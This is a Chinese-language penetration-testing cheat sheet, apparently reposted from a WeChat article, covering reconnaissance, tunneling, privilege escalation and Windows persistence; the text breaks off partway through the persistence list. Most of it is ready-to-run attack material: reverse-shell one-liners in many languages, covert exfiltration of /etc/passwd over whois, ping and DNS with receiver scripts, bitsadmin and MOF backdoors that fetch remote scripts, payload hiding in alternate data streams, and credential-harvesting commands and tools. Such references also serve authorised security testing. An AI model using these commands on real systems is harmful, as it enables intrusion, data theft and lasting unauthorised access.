<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247502179&idx=1&sn=0d02e2fe713008d5c68a8f1c414b8f1a&scene=21#wechat_redirect)

Table of Contents
=================

*   信息搜集
    

*   字典列表
    
*   密码生成
    
*   邮箱列表获取
    
*   泄露密码查询
    
*   对企业外部相关信息进行搜集
    
*   子域名获取
    
*   github
    
*   whois 查询 / 注册人反查 / 邮箱反查 / 相关资产
    
*   google hacking
    
*   开源情报信息收集（OSINT）
    
*   创建企业密码字典
    

*   进入内网
    

*   基于企业弱账号漏洞
    
*   基于系统漏洞进入
    
*   网站应用程序渗透
    
*   无线 Wi-Fi 接入
    

*   隐匿攻击
    

*   Command and Control
    
*   Fronting
    
*   代理
    

*   内网跨边界应用
    

*   EW
    
*   Termite
    
*   代理脚本
    
*   内网跨边界转发
    
*   内网跨边界代理穿透
    
*   shell 反弹
    
*   内网文件的传输和下载
    
*   搭建 HTTP server
    

*   内网信息搜集
    

*   端口扫描
    
*   内网拓扑架构分析
    
*   常见信息收集命令
    
*   常用端口扫描工具
    
*   1、用户列表
    
*   2、进程列表
    
*   3、服务列表
    
*   4、端口列表
    
*   5、补丁列表
    
*   6、本机共享
    
*   7、本用户习惯分析
    
*   8、获取当前用户密码工具
    
*   Windows
    
*   Linux
    
*   本机信息搜集
    
*   扩散信息收集
    
*   第三方信息收集
    

*   权限提升
    

*   内核溢出提权
    
*   计划任务
    
*   SUID
    
*   系统服务的错误权限配置漏洞
    
*   不安全的文件 / 文件夹权限配置
    
*   找存储的明文用户名，密码
    
*   BypassUAC
    
*   提权
    
*   常用方法
    
*   常用工具
    
*   Windows
    
*   Linux
    

*   权限维持
    

*   Windows
    
*   Linux
    
*   1、密码记录工具
    
*   2、常用的存储 Payload 位置
    
*   3、Run/RunOnce Keys
    
*   4、BootExecute Key
    
*   5、Userinit Key
    
*   6、Startup Keys
    
*   7、Services
    
*   8、Browser Helper Objects
    
*   9、AppInit_DLLs
    
*   10、文件关联
    
*   11、bitsadmin
    
*   12、mof
    
*   13、wmi
    
*   14、Userland Persistence With Scheduled Tasks
    
*   15、Netsh
    
*   16、Shim
    
*   17、DLL 劫持
    
*   18、DoubleAgent
    
*   19、waitfor.exe
    
*   20、AppDomainManager
    
*   21、Office
    
*   22、CLR
    
*   23、msdtc
    
*   24、Hijack CAccPropServicesClass and MMDeviceEnumerato
    
*   25、Hijack explorer.exe
    
*   26、Windows FAX DLL Injection
    
*   27、特殊注册表键值
    
*   28、快捷方式后门
    
*   29、Logon Scripts
    
*   30、Password Filter DLL
    
*   31、利用 BHO 实现 IE 浏览器劫持
    
*   crontab
    
*   硬链接 sshd
    
*   SSH Server wrapper
    
*   SSH keylogger
    
*   Cymothoa_进程注入 backdoor
    
*   rootkit
    
*   Tools
    
*   系统后门
    
*   WEB 后门
    

*   横向渗透
    

*   Bypass Applocker
    
*   bypassAV
    
*   信息搜集
    
*   获取域控的方法
    
*   获取 AD 哈希
    
*   AD 持久化
    
*   其他
    
*   TIPS
    
*   相关工具
    
*   powerview.ps1
    
*   BloodHound
    
*   获取域内 DNS 信息
    
*   SYSVOL
    
*   MS14-068 Kerberos
    
*   SPN 扫描
    
*   Kerberos 的黄金门票
    
*   Kerberos 的银票务
    
*   域服务账号破解
    
*   凭证盗窃
    
*   NTLM relay
    
*   Kerberos 委派
    
*   地址解析协议
    
*   Zerologon
    
*   noPac
    
*   ADCS
    
*   CVE-2022-26923
    
*   活动目录持久性技巧
    
*   Security Support Provider
    
*   SID History
    
*   AdminSDHolder＆SDProp
    
*   组策略
    
*   Hook PasswordChangeNotify
    
*   Kerberoasting 后门
    
*   AdminSDHolder
    
*   Delegation
    
*   黄金证书
    
*   域内主机提权
    
*   Exchange 的利用
    
*   端口扫描
    
*   端口爆破
    
*   端口弱口令
    
*   端口溢出
    
*   常见的默认端口
    
*   1、web 类 (web 漏洞 / 敏感目录)
    
*   2、数据库类 (扫描弱口令)
    
*   3、特殊服务类 (未授权 / 命令执行类 / 漏洞)
    
*   4、常用端口类 (扫描弱口令 / 端口爆破)
    
*   5、端口合计所对应的服务
    
*   端口渗透
    
*   域渗透
    
*   在远程系统上执行程序
    
*   IOT 相关
    
*   中间人
    
*   规避杀软及检测
    

*   痕迹清理
    

*   Windows 日志清除
    
*   破坏 Windows 日志记录功能
    
*   Metasploit
    
*   3389 登陆记录清除
    

信息搜集
----

### 开源情报信息收集（OSINT）

#### github

*   Github_Nuggests（自动爬取 Github 上文件敏感信息泄露） :https://github.com/az0ne/Github_Nuggests
    
*   GSIL（能够实现近实时（15 分钟内）的发现 Github 上泄露的信息） :https://github.com/FeeiCN/GSIL
    
*   x-patrol(小米团队的):https://github.com/MiSecurity/x-patrol
    

#### whois 查询 / 注册人反查 / 邮箱反查 / 相关资产

*   站长之家: http://whois.chinaz.com/?DomainName=target.com&ws=
    
*   爱站: https://whois.aizhan.com/target.com/
    
*   微步在线: https://x.threatbook.cn/
    
*   IP 反查: https://dns.aizhan.com/
    
*   天眼查: https://www.tianyancha.com/
    
*   虎妈查: http://www.whomx.com/
    
*   历史漏洞查询 :
    

*   在线查询: http://wy.zone.ci/
    
*   自搭建: https://github.com/hanc00l/wooyun_publi/
    

#### google hacking

### 创建企业密码字典

#### 字典列表

*   passwordlist:https://github.com/lavalamp-/password-lists
    
*   猪猪侠字典: https://pan.baidu.com/s/1dFJyedz Blasting_dictionary（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等）
    
*   针对特定的厂商，重点构造厂商相关域名的字典
    

```
['%pwd%123','%user%123','%user%521','%user%2017','%pwd%321','%pwd%521','%user%321','%pwd%123!','%pwd%123!@#','%pwd%1234','%user%2016','%user%123$%^','%user%123!@#','%pwd%2016','%pwd%2017','%pwd%1!','%pwd%2@','%pwd%3#','%pwd%123#@!','%pwd%12345','%pwd%123$%^','%pwd%!@#456','%pwd%123qwe','%pwd%qwe123','%pwd%qwe','%pwd%123456','%user%123#@!','%user%!@#456','%user%1234','%user%12345','%user%123456','%user%123!']
```

#### 密码生成

*   GenpAss（中国特色的弱口令生成器: https://github.com/RicterZ/genpAss/
    
*   passmaker（可以自定义规则的密码字典生成器） ：https://github.com/bit4woo/passmaker
    
*   pydictor（强大的密码生成器） ：https://github.com/LandGrey/pydictor
    

#### 邮箱列表获取

*   theHarvester ：https://github.com/laramies/theHarvester
    
*   获取一个邮箱以后导出通讯录
    
*   LinkedInt :https://github.com/mdsecactivebreach/LinkedInt
    
*   Mailget：https://github.com/Ridter/Mailget
    

#### 泄露密码查询

*   ghostproject: https://ghostproject.fr/
    
*   pwndb: https://pwndb2am4tzkvold.onion.to/
    

#### 对企业外部相关信息进行搜集

##### 子域名获取

*   Layer 子域名挖掘机 4.2 纪念版
    
*   subDomainsBrute ：https://github.com/lijiejie/subDomainsBrute
    
*   wydomain ：https://github.com/ring04h/wydomain
    
*   Sublist3r ：https://github.com/aboul3la/Sublist3r
    
*   企查查：https://www.qcc.com/
    
*   天眼查：https://www.tianyancha.com/
    
*   site:target.com:https://www.google.com
    
*   Github 代码仓库
    
*   抓包分析请求返回值 (跳转 / 文件上传 / app/api 接口等)
    
*   站长帮手 links 等在线查询网站
    
*   域传送漏洞
    

Linux

```
dig @ns.example.com example=.com AXFR 
```

Windows

```
nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器nslookup #进入nslookup交互模式server dns.domian.com #指定dns服务器ls xxx.yyy.cn #列出域信息
```

*   GetDomainsBySSL.py :https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&type=note#/
    
*   censys.io 证书 :https://censys.io/certificates?q=target.com
    
*   crt.sh 证书查询: https://crt.sh/?q=%25.target.com
    
*   shadon :https://www.shodan.io/
    
*   zoomeye :https://www.zoomeye.org/
    
*   fofa :https://fofa.so/
    
*   censys：https://censys.io/
    
*   dnsdb.io :https://dnsdb.io/zh-cn/search?q=target.com
    
*   api.hackertarget.com :http://api.hackertarget.com/reversedns/?q=target.com
    
*   community.riskiq.com :https://community.riskiq.com/Search/target.com
    
*   subdomain3 :https://github.com/yanxiu0614/subdomain3
    
*   FuzzDomain :https://github.com/Chora10/FuzzDomain
    
*   dnsdumpster.com :https://dnsdumpster.com/
    
*   phpinfo.me :https://phpinfo.me/domain/
    
*   dns 开放数据接口 :https://dns.bufferover.run/dns?q=baidu.com
    

进入内网
----

### 基于企业弱账号漏洞

*   VPN（通过邮箱，密码爆破，社工等途径获取 VPN）
    
*   企业相关运维系统（zabbix 等）
    

### 基于系统漏洞进入

*   Metasploit(漏洞利用框架):https://github.com/rapid7/metasploit-framework
    
*   漏洞利用脚本
    

### 网站应用程序渗透

*   SQL 注入
    
*   跨站脚本（XSS）
    
*   跨站请求伪造（CSRF）
    
*   SSRF（ssrf_proxy）
    
*   功能 / 业务逻辑漏洞
    
*   其他漏洞等
    
*   CMS - 内容管理系统漏洞
    
*   企业自建代理
    

### 无线 Wi-Fi 接入

隐匿攻击
----

### Command and Control

*   ICMP :https://pentestlab.blog/2017/07/28/command-and-control-icmp/
    
*   DNS :https://pentestlab.blog/2017/09/06/command-and-control-dns/
    
*   DropBox :https://pentestlab.blog/2017/08/29/command-and-control-dropbox/
    
*   Gmail :https://pentestlab.blog/2017/08/03/command-and-control-gmail/
    
*   Telegram :http://drops.xmd5.com/static/drops/tips-16142.html
    
*   Twitter :https://pentestlab.blog/2017/09/26/command-and-control-twitter/
    
*   Website Keyword :https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/
    
*   PowerShell :https://pentestlab.blog/2017/08/19/command-and-control-powershell/
    
*   Windows COM :https://pentestlab.blog/2017/09/01/command-and-control-windows-com/
    
*   WebDAV :https://pentestlab.blog/2017/09/12/command-and-control-webdav/
    
*   Office 365 :https://www.anquanke.com/post/id/86974
    
*   HTTPS :https://pentestlab.blog/2017/10/04/command-and-control-https/
    
*   Kernel :https://pentestlab.blog/2017/10/02/command-and-control-kernel/
    
*   Website :https://pentestlab.blog/2017/11/14/command-and-control-website/
    
*   WMI :https://pentestlab.blog/2017/11/20/command-and-control-wmi/
    
*   WebSocket :https://pentestlab.blog/2017/12/06/command-and-control-websocket/
    
*   Images :https://pentestlab.blog/2018/01/02/command-and-control-images/
    
*   Web Interface :https://pentestlab.blog/2018/01/03/command-and-control-web-interface/
    
*   JavaScript :https://pentestlab.blog/2018/01/08/command-and-control-javascript/
    
*   ...
    

### Fronting

*   Domain Fronting
    
*   Tor_Fronting.
    

### 代理

*   VPN
    
*   shadowsockts :https://github.com/shadowsocks
    
*   HTTP :http://cn-proxy.com/
    
*   Tor
    

内网跨边界应用
-------

### 内网跨边界转发

*   NC 端口转发
    
*   LCX 端口转发
    
*   nps -> 个人用觉得比较稳定 ～
    
*   frp
    
*   代理脚本
    

1.  Tunna
    
2.  Reduh
    

*   ...
    

### 内网跨边界代理穿透

#### EW

正向 SOCKS v5 服务器:

```
./ew -s ssocksd -l 1080
```

反弹 SOCKS v5 服务器: a) 先在一台具有公网 ip 的主机 A 上运行以下命令：

```
$ ./ew -s rcsocks -l 1080 -e 8888 
```

b) 在目标主机 B 上启动 SOCKS v5 服务 并反弹到公网主机的 8888 端口

```
$ ./ew -s rssocks -d 1.1.1.1 -e 8888 
```

多级级联

```
$ ./ew -s lcx_listen -l 1080 -e 8888
$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
```

lcx_tran 的用法

```
$ ./ew -s ssocksd -l 9999
$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
```

lcx_listen、lcx_slave 的用法

```
$ ./ew -s lcx_listen -l 1080 -e 8888
$ ./ew -s ssocksd -l 9999
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
```

“三级级联” 的本地 SOCKS 测试用例以供参考

```
$ ./ew -s rcsocks -l 1080 -e 8888
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
$ ./ew -s lcx_listen -l 9999 -e 7777
$ ./ew -s rssocks -d 127.0.0.1 -e 7777
```

#### Termite

使用说明: https://rootkiter.com/Termite/README.txt

#### 代理脚本

reGeorg :https://github.com/sensepost/reGeorg Neo-reGeorg:https://github.com/L-codes/Neo-reGeorg pystinger(毒刺):https://github.com/FunnyWolf/pystinger ABPTTS:https://github.com/nccgroup/ABPTTS

### shell 反弹

bash

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

php

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

java

```
r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()
```

nc

```
#使用-e nc -e /bin/sh 223.8.200.234 1234
```

```
#不使用-emknod /tmp/backpipe p/bin/sh 0/tmp/backpipe | nc attackerip listenport 1>/tmp/backpipe
```

lua

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### 内网文件的传输和下载

wput

```
wput dir_name ftp://linuxpig:123456@host.com/
```

wget

```
wget http://site.com/1.rar -O 1.rar
```

ariac2（需安装）

```
aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2
```

powershell

```
$p = New-Object System.Net.WebClient $p.DownloadFile("http://domain/file","C:%homepath%file")
```

vbs 脚本

```
Set args = Wscript.ArgumentsUrl = "http://domain/file"dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")dim bStrm: Set bStrm = createobject("Adodb.Stream")xHttp.Open "GET", Url, FalsexHttp.Sendwith bStrm.type = 1 '.open.write xHttp.responseBody.savetofile " C:\%homepath%\file", 2 'end with
```

> 执行 ：cscript test.vbs

Perl

```
#!/usr/bin/perl use LWP::Simple; getstore("http://domain/file", "file");
```

> 执行：perl test.pl

Python

```
#!/usr/bin/python import urllib2 u = urllib2.urlopen('http://domain/file') localFile = open('local_file', 'w') localFile.write(u.read()) localFile.close()
```

> 执行：python test.py

Ruby

```
#!/usr/bin/rubyrequire 'net/http'Net::HTTP.start("www.domain.com") { |http|r = http.get("/file")open("save_location", "wb") { |file|file.write(r.body)\}\}
```

> 执行：ruby test.rb

PHP

```
<?php$url  = 'http://www.example.com/file';$path = '/path/to/file';$ch = curl_init($url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$data = curl_exec($ch);curl_close($ch);file_put_contents($path, $data);?>
```

> 执行：php test.php

NC attacker

```
cat file | nc -l 1234
```

target

```
nc host_ip 1234 > file
```

FTP

```
ftp 127.0.0.1 username password get file exit
```

TFTP

```
tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
```

Bitsadmin

```
bitsadmin /transfer n http://domain/file c:%homepath%file
```

Window 文件共享

```
net use x: \127.0.0.1\share /user:example.comuserID myPassword
```

SCP 本地到远程

```
scp file user@host.com:/tmp
```

远程到本地

```
scp user@host.com:/tmp file
```

rsync 远程 rsync 服务器中拷贝文件到本地机

```
rsync -av root@192.168.78.192::www /databack
```

本地机器拷贝文件到远程 rsync 服务器

```
rsync -av /databack root@192.168.78.192::www
```

certutil.exe

```
certutil.exe -urlcache -split -f http://site.com/file
```

copy

```
copy \\IP\ShareName\file.exe file.exe
```

WHOIS 接收端 Host B：

```
nc -vlnp 1337 | sed "s/ //g" | base64 -d
```

发送端 Host A：

```
whois -h host_ip -p 1337 `cat /etc/passwd | base64`
```

WHOIS + TAR First:

```
ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it
```

Next

```
tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits
```

Finally

```
cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv #to get the files out
```

PING 发送端:

```
xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
```

接收端 ping_receiver.py:

```
import systry:    from scapy.all import *except:    print("Scapy not found, please install scapy: pip install scapy")    sys.exit(0)def process_packet(pkt):    if pkt.haslayer(ICMP):        if pkt[ICMP].type == 8:            data = pkt[ICMP].load[-4:]            print(f'{data.decode("utf-8")}', flush=True, end="", sep="")sniff(iface="eth0", prn=process_packet)
```

```
python3 ping_receiver.py
```

DIG 发送端:

```
xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done
```

接收端 dns_reciver.py:

```
try:    from scapy.all import *except:    print("Scapy not found, please install scapy: pip install scapy")def process_packet(pkt):    if pkt.haslayer(DNS):        domain = pkt[DNS][DNSQR].qname.decode('utf-8')        root_domain = domain.split('.')[1]        if root_domain.startswith('gooogle'):            print(f'{bytearray.fromhex(domain[:-13]).decode("utf-8")}', flush=True, end='')sniff(iface="eth0", prn=process_packet)
```

```
python3 dns_reciver.py
```

...

### 搭建 HTTP server

python2

```
python -m SimpleHTTPServer 1337
```

python3

```
python -m http.server 1337
```

PHP 5.4+

```
php -S 0.0.0.0:1337
```

ruby

```
ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'
```

```
ruby -run -e httpd . -p 1337
```

Perl

```
perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'
```

```
perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |" : $1) if /^GET \/(.*) / })'
```

busybox httpd

```
busybox httpd -f -p 8000
```

内网信息搜集
------

### 本机信息搜集

#### 1、用户列表

windows 用户列表 分析邮件用户，内网 [域] 邮件用户，通常就是内网 [域] 用户

#### 2、进程列表

析杀毒软件 / 安全监控工具等 邮件客户端 VPN ftp 等

#### 3、服务列表

与安全防范工具有关服务 [判断是否可以手动开关等] 存在问题的服务 [权限 / 漏洞]

#### 4、端口列表

开放端口对应的常见服务 / 应用程序 [匿名 / 权限 / 漏洞等] 利用端口进行信息收集

#### 5、补丁列表

分析 Windows 补丁 第三方软件 [Java/Oracle/Flash 等] 漏洞

#### 6、本机共享

本机共享列表 / 访问权限 本机访问的域共享 / 访问权限

#### 7、本用户习惯分析

历史记录 收藏夹 文档等

#### 8、获取当前用户密码工具

##### Windows

*   mimikatz
    
*   wce
    
*   Invoke-WCMDump
    
*   mimiDbg
    
*   LaZagne
    
*   nirsoft_package
    
*   QuarksPwDump fgdump
    
*   星号查看器等
    

##### Linux

*   LaZagne
    
*   mimipenguin
    

##### 浏览器

*   HackBrowserData
    
*   SharpWeb
    
*   SharpDPAPI
    
*   360SafeBrowsergetpass
    

##### 其他

*   SharpDecryptPwd
    
*   Decrypt_Weblogic_Password
    
*   OA-Seeyou
    

### 扩散信息收集

#### 端口扫描

##### 常用端口扫描工具

*   nmap
    
*   masscan
    
*   zmap
    
*   s 扫描器
    
*   自写脚本等
    
*   NC
    
*   ...
    

#### 内网拓扑架构分析

*   DMZ
    
*   管理网
    
*   生产网
    
*   测试网
    

#### 常见信息收集命令

ipconfig:

```
ipconfig /all ------> 查询本机 IP 段，所在域等
```

net:

```
net user ------> 本机用户列表net localgroup administrators ------> 本机管理员[通常含有域用户]net user /domain ------> 查询域用户net group /domain ------> 查询域里面的工作组net group "domain admins" /domain ------> 查询域管理员用户组net localgroup administrators /domain ------> 登录本机的域管理员net localgroup administrators workgroup\user001 /add ----->域用户添加到本机 net group "Domain controllers" -------> 查看域控制器(如果有多台)net view ------> 查询同一域内机器列表 net view /domain ------> 查询域列表net view /domain:domainname
```

dsquery

```
dsquery computer domainroot -limit 65535 && net group "domaincomputers" /domain ------> 列出该域内所有机器名dsquery user domainroot -limit 65535 && net user /domain------>列出该域内所有用户名dsquery subnet ------>列出该域内网段划分dsquery group && net group /domain ------>列出该域内分组 dsquery ou ------>列出该域内组织单位 dsquery server && net time /domain------>列出该域内域控制器
```

### 第三方信息收集

*   NETBIOS 信息收集
    
*   SMB 信息收集
    
*   空会话信息收集
    
*   漏洞信息收集等
    

权限提升
----

### Windows

#### BypassUAC

##### 常用方法

*   使用 IFileOperation COM 接口
    
*   使用 Wusa.exe 的 extract 选项
    
*   远程注入 SHELLCODE 到傀儡进程
    
*   DLL 劫持，劫持系统的 DLL 文件
    
*   eventvwr.exe and registry hijacking
    
*   sdclt.exe
    
*   SilentCleanup
    
*   wscript.exe
    
*   cmstp.exe
    
*   修改环境变量，劫持高权限. Net 程序
    
*   修改注册表 HKCU\Software\Classes\CLSID，劫持高权限程序
    
*   直接提权过 UAC
    

##### 常用工具

*   UACME
    
*   Bypass-UAC
    
*   Yamabiko
    
*   ...
    

#### 提权

*   windows 内核漏洞提权
    

> 检测类: Windows-Exploit-Suggester,WinSystemHelper,wesng

> 利用类: windows-kernel-exploits，BeRoot

*   服务提权
    

> 数据库服务，ftp 服务等

*   WINDOWS 错误系统配置
    
*   系统服务的错误权限配置漏洞
    
*   不安全的注册表权限配置
    
*   不安全的文件 / 文件夹权限配置
    
*   计划任务
    
*   任意用户以 NT AUTHORITY\SYSTEM 权限安装 msi
    
*   提权脚本
    

> PowerUP,ElevateKit

### Linux

#### 内核溢出提权

linux-kernel-exploits

#### 计划任务

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#### SUID

```
find / -user root -perm -4000 -print 2>/dev/nullfind / -perm -u=s -type f 2>/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} \;
```

寻找可利用 bin：https://gtfobins.github.io/

#### 系统服务的错误权限配置漏洞

```
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

#### 不安全的文件 / 文件夹权限配置

```
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

#### 找存储的明文用户名，密码

```
grep -i user [filename]grep -i pass [filename]grep -C 5 "password" [filename]find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla
```

权限维持
----

### 系统后门

#### Windows

##### 1、密码记录工具

WinlogonHack WinlogonHack 是一款用来劫取远程 3389 登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000 下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。键盘记录器 安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。NTPass 获取管理员口令, 一般用 gina 方式来, 但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。Linux 下 openssh 后门 重新编译运行的 sshd 服务，用于记录用户的登陆密码。

##### 2、常用的存储 Payload 位置

WMI : 存储：

```
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)$StaticClass.Name = 'Win32_Command'$StaticClass.Put()$StaticClass.Properties.Add('Command' , $Payload)$StaticClass.Put()
```

读取:

```
$Payload=([WmiClass] 'Win32_Command').Properties['Command'].Value
```

包含数字签名的 PE 文件 利用文件 hash 的算法缺陷，向 PE 文件中隐藏 Payload，同时不影响该 PE 文件的数字签名 特殊 ADS …

```
type putty.exe > ...:putty.exewmic process call create c:\test\ads\...:putty.exe
```

特殊 COM 文件

```
type putty.exe > \\.\C:\test\ads\COM1:putty.exewmic process call create \\.\C:\test\ads\COM1:putty.exe
```

磁盘根目录

```
type putty.exe >C:\:putty.exe wmic process call create C:\:putty.exe
```

##### 3、Run/RunOnce Keys

用户级

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

管理员

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```

##### 4、BootExecute Key

由于 smss.exe 在 Windows 子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：

```
HKLM\SYSTEM\CurrentControlSet\Control\hivelist
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager
```

##### 5、Userinit Key

WinLogon 进程加载的 login scripts, 具体键值：

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

##### 6、Startup Keys

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
```

##### 7、Services

创建服务

```
sc create [ServerName] binPath= BinaryPathName
```

##### 8、Browser Helper Objects

本质上是 Internet Explorer 启动时加载的 DLL 模块

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects
```

##### 9、AppInit_DLLs

加载 User32.dll 会加载的 DLL

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
```

##### 10、文件关联

```
HKEY_LOCAL_MACHINE\Software\Classes
HKEY_CLASSES_ROOT
```

##### 11、bitsadmin

```
bitsadmin /create backdoorbitsadmin /addfile backdoor %comspec% %temp%\cmd.exebitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://host.com/calc.sct scrobj.dll"bitsadmin /Resume backdoor
```

##### 12、mof

```
pragma namespace("\\\\.\\root\\subscription") instance of __EventFilter as $EventFilter{EventNamespace = "Root\\Cimv2";Name = "filtP1";Query = "Select * From __InstanceModificationEvent ""Where TargetInstance Isa \"Win32_LocalTime\" ""And TargetInstance.Second = 1";QueryLanguage = "WQL";}; instance of ActiveScriptEventConsumer as $Consumer{Name = "consP1";ScriptingEngine = "JScript";ScriptText = "GetObject(\"script:https://host.com/test\")";}; instance of __FilterToConsumerBinding{Consumer = $Consumer;Filter = $EventFilter;};
```

管理员执行：

```
mofcomp test.mof
```

##### 13、wmi

每隔 60 秒执行一次 notepad.exe

```
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
```

##### 14、Userland Persistence With Scheduled Tasks

劫持计划任务 UserTask，在系统启动时加载 dll

```
function Invoke-ScheduledTaskComHandlerUserTask{[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]Param ([Parameter(Mandatory = $True)][ValidateNotNullOrEmpty()][String]$Command,[Switch]$Force)$ScheduledTaskCommandPath = "HKCU:\Software\Classes\CLSID\{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32"if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){New-Item $ScheduledTaskCommandPath -Force |New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null}else{Write-Verbose "Key already exists, consider using -Force"exit}if (Test-Path $ScheduledTaskCommandPath) {Write-Verbose "Created registry entries to hijack the UserTask"}else{Write-Warning "Failed to create registry key, exiting"exit} }Invoke-ScheduledTaskComHandlerUserTask -Command "C:\test\testmsg.dll" -Verbose
```

##### 15、Netsh

```
netsh add helper c:\test\netshtest.dll
```

后门触发：每次调用 netsh

> dll 编写: https://github.com/outflanknl/NetshHelperBeacon

##### 16、Shim

常用方式：InjectDll RedirectShortcut RedirectEXE

##### 17、DLL 劫持

通过 Rattler 自动枚举进程，检测是否存在可用 dll 劫持利用的进程 使用：Procmon 半自动测试更精准，常规生成的 dll 会导致程序执行报错或中断，使用 AheadLib 配合生成 dll 劫持利用源码不会影响程序执行 工具：https://github.com/sensepost/rattler 工具：https://github.com/Yonsm/AheadLib

##### 18、DoubleAgent

